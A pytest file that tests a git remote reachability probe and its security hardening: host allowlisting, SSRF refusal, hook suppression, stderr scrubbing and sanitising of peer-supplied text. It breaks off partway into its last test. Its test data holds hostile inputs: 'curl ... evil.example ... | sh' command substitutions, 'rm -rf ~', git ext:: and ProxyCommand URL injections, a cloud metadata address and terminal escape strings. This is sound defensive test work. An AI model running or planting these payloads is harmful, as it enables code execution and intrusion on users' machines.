"""The destination's reachability / prerequisite probe (docs/design/move-working-set.md §11.1).

Live finding (Mac -> node2, 2026-11-18 17:12Z): every worktree said
``clone_check: "pending_destination"``, the user confirmed, and node2 could neither
fetch the SSH remote nor push the HTTPS one. The preflight now asks the DESTINATION,
before the confirmation, and each cell pins one answer with REAL git:

* ``ok`` — the destination can ``ls-remote`` and ``push --dry-run``;
* ``destination_cannot_fetch`` — ``ls-remote`` fails;
* ``destination_cannot_push`` — fetch works, the receive-pack advertisement is
  refused (a fake ssh that serves upload-pack and denies receive-pack, the exact
  shape GitHub's SSH answer has);
* SSH unreachable but HTTPS works — ``https_rewrite`` is OFFERED (applied in PR B);
* hostile URLs (``ext::``, ``file://``, local paths, option-shaped) are refused
  WITHOUT running git;
* the dry-run push writes nothing to the remote;
* missing toolchains and Team Bridge enrolment are reported, never blocking;
* an older destination reads ``unknown_destination`` on the offload's link ask.

Isolation: ``GIT_CONFIG_SYSTEM``/``GIT_CONFIG_GLOBAL`` are ``/dev/null`` and
``GIT_TERMINAL_PROMPT=0``; remotes are local bare repositories reached through
``url.<path>.insteadOf`` (the module's test seam) or a fake ``GIT_SSH_COMMAND``.
No network, no real credential.
"""

from __future__ import annotations

import os
import stat
from pathlib import Path
from typing import Any

import pytest

from local_operator.network import mobility, workset, workset_probe
from tests.unit.network.test_mobility import (  # noqa: F401 — `devices` is a fixture
    SESSION,
    Devices,
    _owned_session,
    devices,
)
from tests.unit.network.test_relay_e2e import _pair_settled
from tests.unit.network.workset_rig import Rig, git, make_rig, point_session_at

HTTPS = "https://git.test/owner/proj.git"
SSH = "ssh://git.test/owner/proj.git"
SCP = "git@git.test:owner/proj.git"
#: The destination as the remedy names it: its mesh id, never its chosen name (S10).
NODE2 = "d_82b36b3c77a7b799f694f5cdd3dfe4d0"

_FAKE_SSH = """#!/bin/sh
# argv: <host> <command>; the command is the last argument (GIT_SSH_VARIANT=simple).
for last; do :; done
case "$FAKE_SSH_MODE:$last" in
  deny_all:*) echo "ssh: connect to host git.test port 22: Connection refused" >&2; exit 255;;
  *:git-upload-pack*) exec git upload-pack "$FAKE_SSH_REPO";;
  allow:git-receive-pack*) exec git receive-pack "$FAKE_SSH_REPO";;
  *:git-receive-pack*) echo "ERROR: Permission to owner/proj.git denied to probe." >&2; exit 128;;
esac
exit 1
"""


@pytest.fixture()
def rig(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Rig:
    built = make_rig(tmp_path / "ws")
    monkeypatch.setenv("HOME", str(built.home))
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_TERMINAL_PROMPT", "0")
    script = tmp_path / "fake-ssh"
    script.write_text(_FAKE_SSH, encoding="utf-8")
    script.chmod(script.stat().st_mode | stat.S_IXUSR)
    monkeypatch.setenv("GIT_SSH_COMMAND", str(script))
    monkeypatch.setenv("GIT_SSH_VARIANT", "simple")
    monkeypatch.setenv("FAKE_SSH_REPO", str(built.origin))
    monkeypatch.setenv("FAKE_SSH_MODE", "deny_push")
    # ``git.test`` does not resolve: the host policy (security S1.3) would refuse it,
    # so the rig names it the way a destination's operator names their own server.
    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test",))
    return built


def _map_https(monkeypatch: pytest.MonkeyPatch, target: Path) -> None:
    """``https://git.test/owner/proj.git`` -> ``target`` for the probe's git only."""
    # ``protocol.file.allow``: the insteadOf target is a local path, which the
    # probe's own ``protocol.allow=never`` refuses outside this seam.
    monkeypatch.setattr(
        workset_probe,
        "_EXTRA_CONFIG",
        (f"url.{target}.insteadOf={HTTPS}", "protocol.file.allow=always"),
    )


def _probe(tmp_path: Path, *rows: dict[str, Any], team_bridge: bool = False) -> dict[str, Any]:
    frame = {"worktrees": list(rows), "team_bridge": team_bridge}
    return workset_probe.run_probe(tmp_path, frame)


def _row(url: str, *, markers: list[str] | None = None) -> dict[str, Any]:
    # The v2 frame row (security S6): a remote and marker names, nothing else.
    return {"remote_url": url, "markers": markers or []}


def test_a_reachable_remote_answers_ok_and_the_dry_run_writes_nothing(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _map_https(monkeypatch, rig.origin)
    refs_before = git(rig.origin, "for-each-ref")

    answer = _probe(tmp_path, _row(HTTPS))

    assert answer["worktrees"][0]["clone_check"] == "ok", answer
    # NO REMOTE WRITE: the throwaway probe branch was never created.
    assert git(rig.origin, "for-each-ref") == refs_before
    assert "lop-move-probe" not in refs_before


def test_an_unfetchable_remote_answers_cannot_fetch(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _map_https(monkeypatch, tmp_path / "does-not-exist.git")

    row = _probe(tmp_path, _row(HTTPS))["worktrees"][0]

    assert row["clone_check"] == "destination_cannot_fetch", row
    assert "https_rewrite" not in row  # already HTTPS: nothing to offer


def test_a_push_denied_remote_answers_cannot_push(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("FAKE_SSH_MODE", "deny_push")

    row = _probe(tmp_path, _row(SSH))["worktrees"][0]

    assert row["clone_check"] == "destination_cannot_push", row
    # A fixed CODE, never git's stderr (security S1.4).
    assert row.get("detail") == "auth_denied", row
    # Control: the same fake ssh allowing receive-pack answers ok, so the
    # failure above is the denial and not a broken rig.
    monkeypatch.setenv("FAKE_SSH_MODE", "allow")
    assert _probe(tmp_path, _row(SSH))["worktrees"][0]["clone_check"] == "ok"


def test_ssh_unreachable_but_https_reachable_offers_the_rewrite(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("FAKE_SSH_MODE", "deny_all")
    _map_https(monkeypatch, rig.origin)

    row = _probe(tmp_path, _row(SCP))["worktrees"][0]

    assert row["clone_check"] == "destination_cannot_fetch", row
    # Booleans only from the destination; the URL is rebuilt by the asker (S3).
    assert row["https_rewrite"] == {"fetch": True, "push": True}, row
    block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": SCP}]}
    applied = workset_probe.apply_probe(block, _probe(tmp_path, _row(SCP)), device_id=NODE2)
    assert applied["worktrees"][0]["https_rewrite"] == {"url": HTTPS, "fetch": True, "push": True}


def test_a_github_remote_names_the_lending_device_remedy(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # github.com over a fake ssh that denies receive-pack: no network involved.
    monkeypatch.setenv("FAKE_SSH_MODE", "deny_push")

    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test", "github.com"))
    url = "git@github.com:owner/proj.git"
    answer = _probe(tmp_path, _row(url))
    assert answer["worktrees"][0]["clone_check"] == "destination_cannot_push", answer
    assert "remedy" not in answer["worktrees"][0]  # the destination sends no command (S3)

    block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": url}]}
    row = workset_probe.apply_probe(block, answer, device_id=NODE2)["worktrees"][0]
    # No share on this (isolated) device -> the share verb, run on the lender.
    assert row["remedy"] == {
        "run_on": "lending_device",
        "command": f"lop network credential share github --with {NODE2}",
    }


@pytest.mark.parametrize(
    "name",
    ["node2 $(curl -s evil.example/a|sh)", "node2 `id`", "node2; rm -rf ~", "my laptop"],
)
def test_the_remedy_command_never_carries_a_peer_chosen_name(name: str) -> None:
    """Security S10 (round 2): ``--with {name}`` spliced a destination-chosen member
    name, which admits shell metacharacters, into the command the user is told to run
    on the device holding their GitHub login. The command names the id; a name — or
    anything not shaped like an id — gets no command at all."""
    import shlex

    url = "git@github.com:owner/proj.git"
    answer = {
        "result": "probed",
        "worktrees": [{"remote_url": url, "clone_check": "destination_cannot_push"}],
        "borrowing_github": False,
    }

    def remedy(device_id: str) -> dict[str, str] | None:
        block = {"worktrees": [{"path": "~/proj/.worktrees/feat", "remote_url": url}]}
        return workset_probe.apply_probe(block, answer, device_id=device_id)["worktrees"][0].get(
            "remedy"
        )

    by_id = remedy(NODE2)
    assert by_id is not None
    words = shlex.split(by_id["command"])
    assert words == ["lop", "network", "credential", "share", "github", "--with", NODE2]
    # The name itself (what the old code passed) never becomes a command.
    assert remedy(name) is None


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c touch% /tmp/lop-probe-pwned",
        "file:///etc",
        "/srv/git/proj.git",
        "./proj.git",
        "~/proj.git",
        "--upload-pack=touch /tmp/x",
        "host:-oProxyCommand=touch /tmp/x",
        "http://git.test/owner/proj.git",
        "fd::17",
        "https://git.test/owner/proj.git\nfoo",
    ],
)
def test_a_hostile_url_is_refused_without_running_git(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, url: str
) -> None:
    calls: list[list[str]] = []
    monkeypatch.setattr(workset_probe, "_git", lambda args, **_kw: calls.append(args) or (True, ""))

    row = _probe(tmp_path, _row(url))["worktrees"][0]

    assert row == {
        "remote_url": url,
        "clone_check": "destination_cannot_clone",
        "detail": "url_refused",
        "missing_tools": [],
    }
    assert calls == []


def test_missing_toolchains_and_team_bridge_are_reported_never_blocking(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    present = {"git", "node", "uv"}
    monkeypatch.setattr(
        workset_probe.shutil, "which", lambda name: f"/bin/{name}" if name in present else None
    )
    monkeypatch.setattr(workset_probe, "_can_fetch", lambda url, env: (True, ""))
    monkeypatch.setattr(workset_probe, "_can_push", lambda url, env, scratch: (True, ""))

    answer = _probe(
        tmp_path,
        _row(HTTPS, markers=["go.mod", "pnpm-lock.yaml", "pyproject.toml"]),
        team_bridge=True,
    )

    assert answer["worktrees"][0]["missing_tools"] == ["go", "pnpm"]
    assert answer["worktrees"][0]["clone_check"] == "ok"
    assert answer["team_bridge"] == {"needed": True, "enrolled": False}
    block = {
        "worktrees": [{"path": "~/proj/.worktrees/feat", "state": "planned", "remote_url": HTTPS}]
    }
    applied = workset_probe.apply_probe(block, answer, device_id=NODE2)
    assert applied["worktrees"][0]["state"] == "planned"  # a flag, never a state change
    assert applied["destination_probe"] == {
        "state": "answered",
        "missing_tools": ["go", "pnpm"],
        "team_bridge": {"needed": True, "enrolled": False},
        # PR B: the destination states the working-set protocol it can receive.
        "working_set_version": workset.WORKSET_TRANSFER_VERSION,
    }


# ---------------------------------------------------------------------------
# Through the relays: the preflight carries the destination's answer
# ---------------------------------------------------------------------------


@pytest.fixture()
def pair(request: pytest.FixtureRequest) -> Devices:
    value: Devices = request.getfixturevalue("devices")
    _server_a, server_b, _host, _port = value
    server_b.bind_control()
    server_b.start()
    return value


def _dry_run(server: Any, monkeypatch: pytest.MonkeyPatch, *, to: str) -> dict[str, Any]:
    monkeypatch.setenv("LOCAL_OPERATOR_CONFIG_DIR", str(server.root))
    return dict(mobility.request_move(SESSION, root=server.root, to=to, dry_run=True))


def _ssh_session(pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig) -> None:
    server_a, server_b, _host, _port = pair
    _pair_settled(pair, monkeypatch, role="admin", settings=server_b.settings)
    git(rig.primary, "remote", "set-url", "origin", SSH)
    point_session_at(_owned_session(server_a), rig.feat)


def test_the_offload_preflight_asks_the_destination_and_flags_the_row(
    pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig
) -> None:
    server_a, server_b, _host, _port = pair
    _ssh_session(pair, monkeypatch, rig)
    asked: list[str] = []
    real = mobility._destination_workset_probe

    def spy(server: Any, link: Any, frame: dict[str, Any]) -> dict[str, Any]:
        asked.append(server.identity.device_id)
        return real(server, link, frame)

    monkeypatch.setattr(mobility, "_destination_workset_probe", spy)

    preflight = _dry_run(server_a, monkeypatch, to=server_b.identity.device_id)

    block = preflight["working_set"]
    assert asked == [server_b.identity.device_id], block  # the DESTINATION answered
    row = next(r for r in block["worktrees"] if r["path"].endswith("feat"))
    assert row["clone_check"] == "destination_cannot_push", row
    assert row["state"] == "planned"
    assert block["destination_probe"]["state"] == "answered"
    assert "pnpm" in row["markers"] or row["markers"] == ["pnpm-lock.yaml"]


def test_the_offload_remedy_names_the_destination_by_id_not_its_chosen_name(
    pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig
) -> None:
    """Security S10 (round 2), through the real preflight: the destination named
    itself ``node2 $(curl …|sh)`` and that name reached the pasteable command."""
    import shlex

    server_a, server_b, _host, _port = pair
    _ssh_session(pair, monkeypatch, rig)
    git(rig.primary, "remote", "set-url", "origin", "git@github.com:owner/proj.git")
    monkeypatch.setenv("FAKE_SSH_MODE", "deny_push")
    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test", "github.com"))
    hostile = "node2 $(curl -s evil.example/a|sh)"
    peer = server_b.identity.device_id
    named = server_a._member_name

    monkeypatch.setattr(
        server_a, "_member_name", lambda device: hostile if device == peer else named(device)
    )

    preflight = _dry_run(server_a, monkeypatch, to=peer)

    row = next(r for r in preflight["working_set"]["worktrees"] if r["path"].endswith("feat"))
    assert row["clone_check"] == "destination_cannot_push", row
    words = shlex.split(row["remedy"]["command"])
    assert words == ["lop", "network", "credential", "share", "github", "--with", peer], words


def test_an_older_destination_reads_unknown_destination_not_a_failure(
    pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig
) -> None:
    server_a, server_b, _host, _port = pair
    _ssh_session(pair, monkeypatch, rig)

    def older(server: Any, link: Any, frame: dict[str, Any]) -> dict[str, Any]:
        # What a pre-feature destination's dispatcher raises for a phase it lacks.
        raise mobility._peer_error("bad_request", "unknown move phase 'workset_probe'")

    monkeypatch.setattr(mobility, "_destination_workset_probe", older)

    preflight = _dry_run(server_a, monkeypatch, to=server_b.identity.device_id)

    assert preflight["ok"] is True, preflight
    block = preflight["working_set"]
    assert {row["clone_check"] for row in block["worktrees"]} == {"unknown_destination"}
    assert block["destination_probe"] == {"state": "unknown_destination"}
    assert preflight["confirmation_required"] is True


def test_the_recall_preflight_probes_this_device_itself(
    pair: Devices, monkeypatch: pytest.MonkeyPatch, rig: Rig
) -> None:
    _server_a, server_b, _host, _port = pair
    _ssh_session(pair, monkeypatch, rig)
    monkeypatch.setenv("FAKE_SSH_MODE", "allow")

    preflight = _dry_run(server_b, monkeypatch, to="local")

    row = next(r for r in preflight["working_set"]["worktrees"] if r["path"].endswith("feat"))
    assert row["clone_check"] == "ok", row
    assert row["missing_tools"] == workset_probe.missing_tools(["pnpm-lock.yaml"])


# ---------------------------------------------------------------------------
# Review round 1 (PR #4241): S1 host policy / fixed codes / admission, S3 no
# destination text, S6 minimal frame, S7 ssh hardening, S8 no hooks, R7 group kill
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://169.254.169.254/latest/meta-data",
        "https://127.0.0.1/x",
        "https://0x7f000001/x",
        "https://2130706433/x",
        "https://localhost:1/x",
        "https://10.0.0.5/x",
        "https://100.64.0.1/x",
        "ssh://127.0.0.1:18777/x",
        "git@192.168.1.10:owner/proj.git",
    ],
)
def test_a_non_public_host_is_refused_without_running_git(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, url: str
) -> None:
    """S1.3: every IP spelling resolves to the same non-public address and is refused."""
    calls: list[list[str]] = []
    monkeypatch.setattr(workset_probe, "_git", lambda args, **_kw: calls.append(args) or (True, ""))

    row = _probe(tmp_path, _row(url))["worktrees"][0]

    assert row["clone_check"] == "destination_cannot_fetch", row
    assert row["detail"] == "host_refused", row
    assert calls == []


def test_ipv4_mapped_ula_and_unspecified_addresses_are_not_public() -> None:
    for address in ("::ffff:127.0.0.1", "fd00::1", "::", "0.0.0.0", "fe80::1", "::1"):
        assert workset_probe._public(address) is False, address
    assert workset_probe._public("140.82.112.3") is True


def test_a_public_https_host_is_pinned_to_the_vetted_address(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
        workset_probe.socket,
        "getaddrinfo",
        lambda host, port, **_kw: [(2, 1, 6, "", ("140.82.112.3", port))],
    )

    allowed, pin = workset_probe.host_policy("https://github.com/owner/proj.git")

    assert allowed is True
    assert pin == ["-c", "http.curloptResolve=github.com:443:140.82.112.3"]


def test_an_operator_named_private_host_is_allowed(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("LOCAL_OPERATOR_MOVE_PROBE_HOSTS", "git.corp.example")
    monkeypatch.setattr(
        workset_probe.socket,
        "getaddrinfo",
        lambda host, port, **_kw: [(2, 1, 6, "", ("10.1.2.3", port))],
    )

    assert workset_probe.host_policy("https://git.corp.example/o/r.git")[0] is True
    assert workset_probe.host_policy("https://other.corp.example/o/r.git")[0] is False


def test_every_probe_git_call_disables_redirects_hooks_and_other_protocols() -> None:
    config = set(workset_probe._BASE_CONFIG)
    assert "http.followRedirects=false" in config
    assert f"core.hooksPath={os.devnull}" in config
    assert {
        "protocol.allow=never",
        "protocol.https.allow=always",
        "protocol.ssh.allow=always",
    } <= config


def test_git_stderr_never_leaves_the_destination(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """S1.4: the SSRF read-back carried an internal error body in ``detail``."""
    secret = "remote: INTERNAL-ONLY: AccessKeyId=FAKE secret=FAKE"
    fake = tmp_path / "git"
    fake.write_text(f"#!/bin/sh\necho '{secret}' >&2\nexit 128\n", encoding="utf-8")
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path}{os.pathsep}{os.environ['PATH']}")

    ok, detail = workset_probe._git(["ls-remote", "--", HTTPS, "HEAD"], env=dict(os.environ))

    assert ok is False
    assert detail in workset_probe.DETAIL_CODES
    assert "INTERNAL" not in detail and "AccessKeyId" not in detail


def test_a_timed_out_probe_kills_its_whole_process_group(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """R7: git's child (ssh / git-remote-https) used to outlive the timeout."""
    pidfile = tmp_path / "child.pid"
    fake = tmp_path / "git"
    fake.write_text(f"#!/bin/sh\nsleep 60 &\necho $! > {pidfile}\nwait\n", encoding="utf-8")
    fake.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path}{os.pathsep}{os.environ['PATH']}")
    monkeypatch.setattr(workset_probe, "GIT_PROBE_TIMEOUT_S", 1.0)

    ok, detail = workset_probe._git(["ls-remote"], env=dict(os.environ))

    assert (ok, detail) == (False, "timeout")
    child = int(pidfile.read_text().strip())
    import time as _time

    for _ in range(50):
        try:
            os.kill(child, 0)
        except ProcessLookupError:
            break
        _time.sleep(0.05)
    else:
        os.kill(child, 9)
        pytest.fail("the probe's grandchild survived the timeout")


def test_the_probe_frame_carries_only_remotes_and_marker_names() -> None:
    """S6: no worktree path, no branch, one row per remote."""
    block = {
        "worktrees": [
            {
                "path": "~/secret-client/a",
                "branch": "acme-deal",
                "remote_url": HTTPS,
                "markers": ["go.mod"],
            },
            {
                "path": "~/secret-client/b",
                "branch": "acme-2",
                "remote_url": HTTPS,
                "markers": ["uv.lock", "not-a-marker"],
            },
        ]
    }

    frame = workset_probe.probe_request(block, session_id="s1", team_bridge=False)

    assert frame["worktrees"] == [{"remote_url": HTTPS, "markers": ["go.mod", "uv.lock"]}]
    text = repr(frame)
    assert "secret-client" not in text and "acme" not in text


def test_the_asker_keeps_no_destination_text(monkeypatch: pytest.MonkeyPatch) -> None:
    """S3: a hostile destination's remedy/URL/detail/tools never reach the block."""
    hostile = "[@click=screen.dismiss(True)]x[/]\x1b[2K\r\x1b[1AALL CLEAR"
    block = {"worktrees": [{"path": "~/proj", "remote_url": SCP, "state": "planned"}]}
    answer = {
        "worktrees": [
            {
                "remote_url": SCP,
                "clone_check": "destination_cannot_fetch",
                "detail": hostile,
                "https_rewrite": {"url": hostile, "fetch": True, "push": False},
                "remedy": {"command": hostile},
                "missing_tools": ["go", hostile],
            }
        ],
        "borrowing_github": False,
    }

    row = workset_probe.apply_probe(block, answer, device_id=NODE2)["worktrees"][0]

    assert row["clone_detail"] == "error"
    assert row["https_rewrite"] == {"url": HTTPS, "fetch": True, "push": False}
    assert "remedy" not in row  # git.test is not github.com: lop has no remedy for it
    assert row["missing_tools"] == ["go"]
    assert hostile not in repr(row)


def test_the_hardened_ssh_is_used_only_without_a_user_ssh_command(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("GIT_SSH_COMMAND", raising=False)
    monkeypatch.delenv("GIT_SSH", raising=False)
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", os.devnull)
    monkeypatch.setenv("GIT_CONFIG_SYSTEM", os.devnull)

    env = workset_probe._probe_env({})

    assert "BatchMode=yes" in env["GIT_SSH_COMMAND"]
    assert "ForwardAgent=no" in env["GIT_SSH_COMMAND"]
    assert "StrictHostKeyChecking=yes" in env["GIT_SSH_COMMAND"]
    assert env["SSH_ASKPASS_REQUIRE"] == "never"
    monkeypatch.setenv("GIT_SSH_COMMAND", "my-ssh")
    assert workset_probe._probe_env({})["GIT_SSH_COMMAND"] == "my-ssh"


@pytest.mark.parametrize(
    "url", ["ssh://-oProxyCommand=id@git.test/p", "-oProxyCommand=id@git.test:p"]
)
def test_an_option_shaped_ssh_user_is_refused(url: str) -> None:
    assert workset_probe.classify_url(url) is None


def test_the_push_probe_runs_no_destination_hook(
    rig: Rig, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """S8: a ``core.hooksPath`` in the destination's own config used to run pre-push."""
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    fired = tmp_path / "fired"
    for name in ("pre-push", "reference-transaction"):
        hook = hooks / name
        hook.write_text(f"#!/bin/sh\necho {name} >> {fired}\n", encoding="utf-8")
        hook.chmod(0o755)
    gitconfig = tmp_path / "gitconfig"
    gitconfig.write_text(f"[core]\n\thooksPath = {hooks}\n", encoding="utf-8")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(gitconfig))
    _map_https(monkeypatch, rig.origin)

    assert _probe(tmp_path, _row(HTTPS))["worktrees"][0]["clone_check"] == "ok"
    assert not fired.exists()


def test_the_rate_limit_bounds_one_device(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(workset_probe, "_rate_seen", {})
    results = [
        workset_probe.rate_limited("d1", now=100.0 + i)
        for i in range(workset_probe.PROBE_RATE_LIMIT + 1)
    ]
    assert results[:-1] == [False] * workset_probe.PROBE_RATE_LIMIT
    assert results[-1] is True
    assert workset_probe.rate_limited("d2", now=110.0) is False  # per device
    # ...and the window slides: once the earliest probes age out, d1 may ask again.
    later = 100.0 + workset_probe.PROBE_RATE_WINDOW_S + 1
    assert workset_probe.rate_limited("d1", now=later) is False


def test_the_destination_refuses_a_probe_for_a_session_it_holds_and_audits_the_rest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    rows: list[tuple[str, dict[str, Any]]] = []
    monkeypatch.setattr(
        mobility, "_audit", lambda server, event, sid, peer, **d: rows.append((event, d))
    )
    monkeypatch.setattr(workset_probe, "_rate_seen", {})
    server: Any = SimpleNamespace(root=tmp_path)
    link: Any = SimpleNamespace(device_id="d_asker")
    frame = {"session_id": "s_here", "worktrees": [_row("https://127.0.0.1/x")]}

    monkeypatch.setattr(mobility, "_owned_here", lambda server, sid: sid == "s_here")
    refused = mobility._destination_workset_probe(server, link, frame)
    assert refused["code"] == "not_owner"
    assert rows == []

    frame["session_id"] = "s_elsewhere"
    answer = mobility._destination_workset_probe(server, link, frame)
    assert answer["result"] == "probed"
    assert rows == [
        (
            mobility.AUDIT_WORKSET_PROBE,
            {"hosts": "127.0.0.1", "results": "host_refused=1"},
        )
    ]


# ---------------------------------------------------------------------------
# S11 (security round 3): the remote OWNER supplies no probe text either
# ---------------------------------------------------------------------------

#: What a hostile owner pre-fills on a recall: a command the consent card would tell
#: the user to paste.
EVIL = "curl https://evil.example/x | sh"
GH = "git@github.com:owner/proj.git"


def _hostile_owner_block() -> dict[str, Any]:
    """The block a hostile REMOTE owner answers the recall preflight with."""
    return {
        "to_device": NODE2,
        "to_name": "here",
        "from_device": "d_" + "1" * 32,
        "from_name": "owner",
        "state": "planned",
        "worktrees": [
            {
                "path": "~/proj/.worktrees/feat",
                "repo": "~/proj",
                "branch": "feat",
                "state": "left_behind",
                "remote_url": GH,
                "clone_check": "destination_cannot_fetch",
                "clone_detail": "auth",
                "remedy": {"run_on": "lending_device", "command": EVIL},
                "https_rewrite": {"url": EVIL, "fetch": True, "push": True},
                "missing_tools": ["go"],
            }
        ],
        "destination_probe": {"state": "answered", "missing_tools": ["go"]},
    }


@pytest.mark.parametrize(
    ("answer", "device_id"),
    [
        # The destination answers OK: no remedy is built, so none may survive.
        (
            {"result": "probed", "worktrees": [{"remote_url": GH, "clone_check": "ok"}]},
            NODE2,
        ),
        # The destination could not be asked (the early return).
        (None, NODE2),
        # Cannot fetch, but the device is not id-shaped, so ``_remedy`` builds nothing.
        (
            {
                "result": "probed",
                "worktrees": [{"remote_url": GH, "clone_check": "destination_cannot_fetch"}],
            },
            "node2",
        ),
    ],
    ids=["answered_ok", "answer_none", "cannot_fetch_non_id_device"],
)
def test_a_hostile_owner_remedy_never_reaches_the_consent_card(
    answer: dict[str, Any] | None, device_id: str
) -> None:
    """S11: ``apply_probe`` only ever ADDED a remedy, so a recall's owner could put
    any command on the card by pre-filling the field. Every probe-owned field is now
    dropped before the answer is folded in, on every outcome."""
    from local_operator.network import workset_text

    block = workset_probe.apply_probe(_hostile_owner_block(), answer, device_id=device_id)
    rendered = "\n".join(workset_text.summary_lines(block, session="sess1", device="here"))

    assert EVIL not in repr(block), block
    assert EVIL not in rendered, rendered
    row = block["worktrees"][0]
    assert "remedy" not in row
    assert "https_rewrite" not in row
    if answer is None:
        assert row["clone_check"] == "unknown_destination"
        assert block["destination_probe"] == {"state": "unknown_destination"}


def test_the_owner_block_is_scrubbed_at_the_recall_preflight_boundary() -> None:
    """S11 audit: ``_probe_destination`` returns an ``unknown``/``unsupported`` block
    untouched, so ``apply_probe``'s strip alone missed it. The recall preflight scrubs
    the owner's block as it crosses the link — probe fields AND a ``left_behind``
    recipe this build would not write ("recreate with: <run>" on the card, the
    receipt and the model's arrival note)."""
    from local_operator.network import workset_text

    owner = _hostile_owner_block()
    owner["scope_digest"] = "sha256:0; " + EVIL
    owner["state"] = "unknown"
    owner["failure"] = {"repo": "~/proj", "cause": "git_error"}
    owner["left_behind"] = [
        {
            "path": "~/proj/node_modules",
            "kind": "dependency_tree",
            "recipe": {"kind": "npm", "run": EVIL, "cwd": "~/proj"},
        },
        {
            "path": "~/proj/.venv",
            "kind": "dependency_tree",
            "recipe": {"kind": "uv", "run": "uv venv && uv sync --frozen", "cwd": "~/proj"},
        },
        {
            "path": "~/other/.venv",
            "kind": "dependency_tree",
            "recipe": {"kind": "uv_pip", "run": "uv venv && uv pip install -r x;sh", "cwd": "~"},
        },
    ]

    class _Transport:
        def ask(self, frame: dict[str, Any], **_: Any) -> dict[str, Any]:
            return {"result": "workset", "working_set": owner}

    block = mobility._ask_workset_preflight(  # noqa: SLF001
        _Transport(),  # type: ignore[arg-type]
        "sess1",
        "d_" + "1" * 32,
        "owner",
    )
    rendered = "\n".join(
        workset_text.summary_lines(block, session="sess1", device="here")
        + workset_text.receipt_lines({**block, "transferred": False}, source="owner")
        + [workset_probe.arrival_note(block, session_id="sess1", source="o", destination="h")]
    )

    assert EVIL not in repr(block) and EVIL not in rendered, rendered
    assert "x;sh" not in repr(block)
    left = block["left_behind"]
    assert "recipe" not in left[0] and "recipe" not in left[2]
    # A recipe this build writes survives, so an honest owner's advice is kept.
    assert left[1]["recipe"]["run"] == "uv venv && uv sync --frozen"
    assert "destination_probe" not in block
    assert "scope_digest" not in block  # printed inside --confirm-working-set <digest>
    assert block["worktrees"][0]["clone_check"] == "pending_destination"
    # The owner's own dict is not mutated (the scrub works on a copy).
    assert owner["left_behind"][0]["recipe"]["run"] == EVIL


def test_every_recipe_this_build_writes_is_trusted(tmp_path: Path) -> None:
    """The closed table cannot drift from the builder: each recipe
    ``dependency_left_behind`` emits passes ``trusted_recipe`` unchanged."""
    from local_operator.network import workset

    home = tmp_path
    seen: set[str] = set()
    cases = {
        "pnpm": ["pnpm-lock.yaml"],
        "npm": ["package-lock.json"],
        "yarn_berry": ["yarn.lock", ".yarnrc.yml"],
        "yarn": ["yarn.lock"],
        "uv": ["uv.lock"],
        "uv_pip": ["requirements-dev.txt"],
    }
    for name, files in cases.items():
        tree = tmp_path / name
        (tree / "node_modules").mkdir(parents=True)
        (tree / ".venv").mkdir()
        for file in files:
            (tree / file).write_text("x")
        for item in workset.dependency_left_behind(tree, tree, home=home):
            if item.recipe is None:
                continue
            raw = item.recipe.to_dict()
            assert workset.trusted_recipe(raw) == raw, raw
            seen.add(raw["run"])
    assert len(seen) >= 6, seen


def test_a_hostile_owner_command_reaches_no_displayed_surface(
    pair: Devices,
    monkeypatch: pytest.MonkeyPatch,
    rig: Rig,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """S11, end to end over a real recall: the OWNER (server_a) answers every block
    with a pre-filled remedy, HTTPS rewrite, probe block and recipe naming ``EVIL``.
    The recalling device (server_b) must show that command on NO surface: the CLI's
    dry-run text, its confirmation summary and prompt, its refusal words, the TUI
    card (``test_session_move_confirm``'s renderer) and the desktop preflight/refusal
    payloads (``desktop_mesh.transfer`` / ``transfer_receipt``)."""
    import asyncio
    import json

    from textual.widgets import Static

    from local_operator import cli
    from local_operator.network import workset, workset_text
    from local_operator.server.utils import desktop_mesh
    from local_operator.tui.app import OperatorApp
    from local_operator.tui.widgets.move_workset_confirm import (
        MoveWorkingSetConfirmScreen,
    )
    from tests.unit.tui.test_app_pilot import FakeSession, _factory

    _server_a, server_b, _host, _port = pair
    _ssh_session(pair, monkeypatch, rig)
    monkeypatch.setenv("FAKE_SSH_MODE", "allow")
